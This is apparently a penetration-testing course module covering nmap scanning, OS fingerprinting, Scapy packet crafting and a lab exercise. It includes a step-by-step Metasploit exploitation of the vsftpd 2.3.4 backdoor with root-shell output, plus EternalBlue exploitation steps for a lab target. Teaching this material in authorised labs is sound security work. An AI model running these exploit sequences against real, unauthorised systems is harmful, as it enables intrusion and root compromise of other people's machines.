# Hands-On Penetration Testing & Vulnerability Assessment: From Reconnaissance to Exploitation

---

## 1. Offensive Security Methodology

Penetration testing workflows require a systematic transition across sequential operational phases:

$$\text{Host Discovery} \longrightarrow \text{Port Scanning} \longrightarrow \text{Service Enumeration} \longrightarrow \text{OS Fingerprinting} \longrightarrow \text{Vulnerability Assessment} \longrightarrow \text{Exploitation}$$

```
+-----------------------------------------------------------------------------------+
|                            THE OFFENSIVE ATTACK CHAIN                             |
+-----------------------------------------------------------------------------------+
|  1. HOST DISCOVERY        Ping Sweeps, ARP Discovery, ICMP Probes                 |
|         |                                                                         |
|         v                                                                         |
|  2. PORT SCANNING         TCP Connect (-sT), SYN Stealth (-sS), UDP (-sU)         |
|         |                                                                         |
|         v                                                                         |
|  3. SERVICE ENUMERATION   Version Probing (-sV), Banner Grabbing, NSE Scripts     |
|         |                                                                         |
|         v                                                                         |
|  4. OS FINGERPRINTING     Stack Analysis (-O), TTL Evaluation, TCP Window Sizing  |
|         |                                                                         |
|         v                                                                         |
|  5. VULNERABILITY SCAN    NVD/CVE Correlation, Exploit-DB, Searchsploit           |
|         |                                                                         |
|         v                                                                         |
|  6. SYSTEM EXPLOITATION   Metasploit (msfconsole), Custom Exploits, Remote Shells |
+-----------------------------------------------------------------------------------+

```

---

## 2. Professional Mindset: Penetration Tester vs. Red Teamer vs. Blue Team

Modern offensive engagements branch into distinct operational philosophies:

| Operational Dimension | Penetration Tester | Red Teamer | Blue Teamer (Defensive / SOC) |
| --- | --- | --- | --- |
| **Primary Objective** | Discover, enumerate, and report **all** accessible vulnerabilities across target scope within a set timeframe. | Emulate realistic threat actors (APTs), achieve specific objectives (e.g., exfiltrate crown jewels), and test defensive response capabilities. | Detect, intercept, analyze, and neutralize unauthorized network and host activity; harden configurations. |
| **Noise Level & Signature** | High / Aggressive. Runs automated scanners, sweeps large port ranges, and fires multiple concurrent probes. | Low / Stealthy. Uses targeted packets, slow timing, evasion profiles, packet fragmentation, and custom command-and-control (C2). | Monitors network telemetry, parses log streams, and flags anomalous traffic bursts or tool-specific signatures. |
| **Operational Methodology** | Follows structural compliance models (OWASP, PTES, NIST SP 800-115). | Objectives-driven (MITRE ATT&CK, TTP emulation, threat intelligence-led). | NIST Cybersecurity Framework (Identify, Protect, Detect, Respond, Recover). |
| **Tool Adaptation** | Uses commercial/open-source tools (Nmap, Nessus, Burp Suite) out-of-the-box. | Modifies tool runtime defaults, crafts raw network layers (Scapy), and uses non-standard flags. | Analyzes protocol anomalies in packet capture engines (Wireshark, Zeek, Snort, Suricata, SIEM). |

---

## 3. Host Discovery & Traffic Analysis (Wireshark Deep Dive)

Before enumerating ports, operators identify responsive endpoints within an assigned CIDR block (e.g., `10.0.2.0/24`).

### Nmap Host Discovery Syntax

```bash
# ARP-based ping sweep across local Layer 2 subnet
sudo nmap -sn 10.0.2.0/24

# Host discovery without DNS reverse lookup, disabling port scan
sudo nmap -sn -n 10.0.2.1-254

```

### The Traffic Reality: Deconstructing Nmap's Wire Signature

When analyzing scans in **Wireshark**, standard scanners exhibit distinct protocol artifacts that differentiate human network traffic from automated tools:

```
[Attacking Node: 10.0.2.4]                            [Target Host: 10.0.2.8]
           |                                                     |
           | ----- Broadcast: Who has 10.0.2.8? Tell 10.0.2.4 -> | (ARP Request)
           | <---- Unicast: 10.0.2.8 is at 08:00:27:xx:xx:xx --- | (ARP Reply)
           |                                                     |
           | ----- TCP SYN [Port 80] (Confirmation Probe) -----> |
           | <---- TCP RST-ACK (Port Closed, but Host Live!) --- |
           |                                                     |
           | [At Scan Completion: Secondary Confirmation Wave]   |
           | ----- TCP SYN [Port 80] (Repeated Probe) ---------> |
           | <---- TCP RST-ACK --------------------------------- |

```

#### Key Traffic Characteristics

1. **Layer 2 ARP Flooding:** When running inside a local Ethernet network, Nmap defaults to sending ARP broadcast requests (`Who has IP X? Tell IP Y`) to every host in the range.
2. **Supplemental TCP Validation Probes:** Nmap frequently sends unsolicited TCP SYN packets to standard ports (like Port 80 or 443) immediately after receiving an ARP reply. If the target returns an `RST-ACK`, Nmap marks the host as **UP**—even though port 80 is closed, the receipt of an operating-system-level reset confirms active IP stack processing.
3. **Scan Idempotence / Verification Waves:** Under standard profiles, Nmap re-scans select ports at the end of the pass to confirm unresponsive nodes, generating repetitive, identifiable traffic patterns in SOC SIEM/IDS systems.

---

## 4. Port Scanning & Transport Layer Behavior

### TCP Full Connect (`-sT`) vs. TCP SYN Stealth (`-sS`)

```
   TCP Full Connect Scan (-sT)                TCP SYN Half-Open Scan (-sS)
[Attacker]              [Target]        [Attacker]              [Target]
    |                      |                |                      |
    | ----- TCP SYN -----> |                | ----- TCP SYN -----> |
    | <--- TCP SYN-ACK --- |                | <--- TCP SYN-ACK --- |
    | ----- TCP ACK -----> |                | ----- TCP RST -----> |
    | ----- TCP RST -----> |                |                      |
  (Handshake Completed & Torn Down)      (Handshake Aborted: No Connection Logged)

```

#### Privilege Constraints & Scanning Mechanics

* **Unprivileged User (`$` shell prompt):** Operating systems prevent non-root users from constructing raw packets via raw sockets. Nmap falls back to invoking standard operating system system calls (`connect()`). This forces a full three-way handshake (`SYN` $\to$ `SYN-ACK` $\to$ `ACK` $\to$ `RST`), which is logged by services like Apache, IIS, or Nginx.
* **Privileged User (`#` or `sudo`):** The operator possesses direct administrative control over the network interface card driver. Nmap constructs custom raw Ethernet/IP frames, dispatching raw `SYN` packets and terminating half-open states with an immediate `RST`. Applications never establish an official session, leaving fewer user-space log footprints.

### Common Scan Flags

```bash
# TCP SYN Half-Open scan across all 65,535 TCP ports with timing template 4
sudo nmap -sS -p- -T4 10.0.2.8 -oN full_tcp_scan.txt

# UDP Scan against targeted administrative/network infrastructure ports
sudo nmap -sU -p 53,67,68,69,123,161,162 10.0.2.8 -oN udp_scan.txt

# Fast scan against top 100 ports
sudo nmap -F 10.0.2.8

```

---

## 5. Service Enumeration & Banner Grabbing

Port discovery alone only exposes open transport-layer sockets. **Service Enumeration (`-sV`)** queries the underlying daemons to determine exact vendor software and build versions.

### Script Execution & Fingerprinting

```bash
# Comprehensive Service Version Detection across specific ports
sudo nmap -sV -p 21,22,80,445 10.0.2.8

# Run targeted vulnerability and configuration NSE scripts
sudo nmap -p 21 --script=ftp-anon,ftp-syst 10.0.2.8

# Run safe NSE vulnerability assessment sweeps against all open ports
sudo nmap -sV --script=vuln 10.0.2.8

```

### Manual Banner Grabbing with Netcat

Automated tooling can be verified manually by opening raw network sockets:

```bash
# Connect directly to service port to extract raw banner
nc -nv 10.0.2.8 21

```

*Expected Output:*

```text
(UNKNOWN) [10.0.2.8] 21 (ftp) open
220 (vsFTPd 2.3.4)

```

---

## 6. Remote Operating System Fingerprinting

Operating systems handle edge-case packet header construction differently. Testers infer the remote kernel architecture using both automated and passive/manual methods:

### Manual TTL (Time-To-Live) Analysis

The IP Header contains an 8-bit Time-To-Live (TTL) integer decremented by each routing hop. The default initial TTL differs significantly across operating system families:

| Operating System Family | Default Initial TTL | Default TCP Window Size |
| --- | --- | --- |
| **Linux / Android / Modern Unix** | 64 | $\approx 5840$ |
| **Microsoft Windows** | 128 | $\approx 8192$ (Variable) |
| **Cisco IOS / Network Appliances** | 255 | Variable |
| **Solaris / AIX** | 255 | Variable |

#### Example: Analyzing Single-Probe ICMP Ping

```bash
ping -c 1 10.0.2.8

```

*Console Output:*

```text
64 bytes from 10.0.2.8: icmp_seq=1 ttl=64 time=0.345 ms

```

*Evaluation:* An incoming TTL of `64` on a local link (zero intermediary routing hops) indicates a **Linux kernel**. If the output read `ttl=128`, the host could be identified as a **Microsoft Windows** node.

### Nmap Active Stack Fingerprinting

```bash
# Active OS fingerprinting combining TCP sequence analysis & response heuristics
sudo nmap -O 10.0.2.8

```

*Mechanics:* Nmap sends a sequence of up to 16 engineered probes (including non-RFC compliant TCP options, specific flag combinations, and UDP probes) to both open and closed ports, parsing differences in the target's TCP/IP stack implementation.

---

## 7. Vulnerability Research & Remote Exploitation

### Case Study: Exploiting vsftpd v2.3.4 (Metasploitable 2)

```
[Attacking Machine: Kali Linux]                      [Target: Metasploitable 2]
         |                                                       |
         | ----- Send Username with smiley face: 'USER user:)' -> | (Port 21)
         | ----- Send Dummy Password: 'PASS password' ---------> |
         |                                                       |
         | <==== Backdoor Triggers Bind Shell on TCP/6200 ====== |
         |                                                       |
         | ----- Direct Root Interactive Connection (TCP/6200) -> |

```

#### 1. Vulnerability Background

In July 2011, the official source code archive for `vsftpd-2.3.4.tar.gz` was compromised upstream. Attackers embedded a malicious backdoor in `sysdeputil.c`:

```c
if (strstr(p_sm_client->user_str, ":)")) {
    vsf_sysutil_extra(); // Triggers fork() binding /bin/sh to TCP Port 6200
}

```

Any authentication attempt supplying a username terminating in the smiling face string `:)` initiates a root bind shell listening on TCP port `6200`.

#### 2. Manual Terminal Verification & Discovery

```bash
# Locate exploit modules locally within the Exploit Database
searchsploit vsftpd 2.3.4

```

*Output:*

```text
-------------------------------------------------- ---------------------------------
 Exploit Title                                    |  Path
-------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution         | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Meta...| unix/remote/17491.rb
-------------------------------------------------- ---------------------------------

```

#### 3. Automated Exploitation via Metasploit Framework (`msfconsole`)

Launch the Metasploit console and execute the exploit cycle:

```bash
# Step 1: Launch Framework Console
msfconsole -q

# Step 2: Query for verified module
msf6 > search vsftpd 2.3.4

# Step 3: Load exploit module
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
# (Alternative syntax: use 0)

# Step 4: Inspect and configure target parameters
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier
   RPORT   21               yes       The target port (TCP)

# Step 5: Assign Target Address
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.0.2.8
RHOSTS => 10.0.2.8

# Step 6: Verify and execute
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

```

*Terminal Session Output:*

```text
[*] 10.0.2.8:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.2.8:21 - USER: 10.0.2.8:21 - Backdoor triggered...
[+] 10.0.2.8:21 - Backdoor service successfully spawned on port 6200!
[*] Found shell.
[*] Command shell session 1 opened (10.0.2.4:43911 -> 10.0.2.8:6200)

id
uid=0(root) gid=0(root) groups=0(root)

uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

whoami
root

```

---

## 8. Packet Crafting & Evasion Concepts (Scapy Fundamentals)

For security assessments requiring strict evasion of intrusion detection systems (IDS/IPS), operators avoid automated tool signatures by manually constructing Layer 3 and Layer 4 protocol headers using Python's **Scapy** library.

```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, sr1

# Construct custom IP and TCP SYN layers
target_ip = "10.0.2.8"
target_port = 80

ip_packet = IP(dst=target_ip)
tcp_packet = TCP(dport=target_port, flags="S")

# Send packet at Layer 3 and capture first response
response = sr1(ip_packet / tcp_packet, timeout=2, verbose=False)

if response and response.haslayer(TCP):
    # Check for SYN-ACK (0x12)
    if response.getlayer(TCP).flags == 0x12:
        print(f"[+] Port {target_port} is OPEN on {target_ip}!")
        # Politely terminate connection with an RST to avoid leaving connection hanging
        sr1(IP(dst=target_ip) / TCP(dport=target_port, flags="R"), timeout=1, verbose=False)
    # Check for RST-ACK (0x14)
    elif response.getlayer(TCP).flags == 0x14:
        print(f"[-] Port {target_port} is CLOSED on {target_ip}.")
else:
    print(f"[?] Port {target_port} is FILTERED or unresponsive.")

```

---

## 9. Comprehensive Command Cheat Sheet

```bash
# ==========================================
# 1. NETWORK INTERFACE & SUBNET RECONNAISSANCE
# ==========================================
ip a                                      # Display network interfaces and CIDR configurations
ip route                                  # Identify active network gateway

# ==========================================
# 2. HOST DISCOVERY (PING SWEEPS)
# ==========================================
sudo nmap -sn 10.0.2.0/24                 # ARP discovery across target network
sudo nmap -sn -n --disable-arp-ping 10.0.2.0/24 # Force Layer 3 ICMP Ping sweep

# ==========================================
# 3. PORT ENUMERATION & TIMING
# ==========================================
sudo nmap -sS -p- -T4 10.0.2.8            # TCP SYN Half-Open scan across all 65,535 ports
sudo nmap -sT -p 1-1000 10.0.2.8          # Full Connect Scan (Standard user profile)
sudo nmap -sU --top-ports 50 10.0.2.8     # Scan top 50 common UDP services

# ==========================================
# 4. SERVICE VERSIONING & BANNER EXTRACTION
# ==========================================
sudo nmap -sV -p- --version-intensity 5 10.0.2.8 # Aggressive service detection
sudo nmap -sV -sC -p 21,22,80 10.0.2.8   # Combine service detection and default NSE scripts

# ==========================================
# 5. OS IDENTIFICATION & FINGERPRINTING
# ==========================================
sudo nmap -O --osscan-guess 10.0.2.8      # Aggressive OS signature matching
ping -c 1 10.0.2.8                        # Inspect initial TTL value (64=Linux, 128=Windows)

# ==========================================
# 6. NSE ENGINE TARGETING
# ==========================================
ls -la /usr/share/nmap/scripts/ | grep ftp # Query available scripts on attacking host
sudo nmap --script=vuln -p 80,445 10.0.2.8 # Target known CVE libraries against services

# ==========================================
# 7. EXPLOITATION & FRAMEWORK AUTOMATION
# ==========================================
searchsploit <service_name> <version>     # Offline exploit database queries
msfconsole -q                             # Silent interactive startup
msf6 > search <cve_or_service>            # Metasploit module searching
msf6 > use <module_path_or_index>         # Context loading
msf6 > set RHOSTS <target_ip>             # Target variable mapping
msf6 > check                              # Verify target vulnerability status without payload
msf6 > exploit                            # Trigger payload deployment

```

---

## 10. Practical Lab Exercise: Target "Blue"

### Objective

Apply the offensive methodology covered in this session to assess and compromise the Windows machine named **"Blue"** (e.g., TryHackMe / Lab Instance).

### Step-by-Step Instructions

1. **Host Discovery:** Confirm the target host is reachable on the lab subnet without alerting perimeter controls:
```bash
sudo nmap -sn -Pn <TARGET_IP>

```


2. **Port Scanning & Service Versioning:** Perform a thorough TCP scan against standard SMB ports:
```bash
sudo nmap -sS -sV -p 139,445 <TARGET_IP>

```


3. **Vulnerability Assessment:** Correlate the operating system (Windows) and service (SMBv1) using specialized vulnerability scripts:
```bash
sudo nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>

```


4. **Exploitation:**
* Launch `msfconsole`.
* Search for `ms17_010_eternalblue`.
* Configure `RHOSTS` with the target IP address.
* Configure `LHOST` with your local VPN/tun0 IP address.
* Execute `exploit` to obtain a shell.


5. **Documentation & Reporting:**
* Take screenshots of every step (Discovery, Identification, Vulnerability Confirmation, Remote Access).
* Note the specific ports, service banners, and commands used.
* Compile your findings into an engagement report detailing the vulnerability, root cause, and remediation steps (e.g., disabling SMBv1 and applying Microsoft Security Bulletin MS17-010).
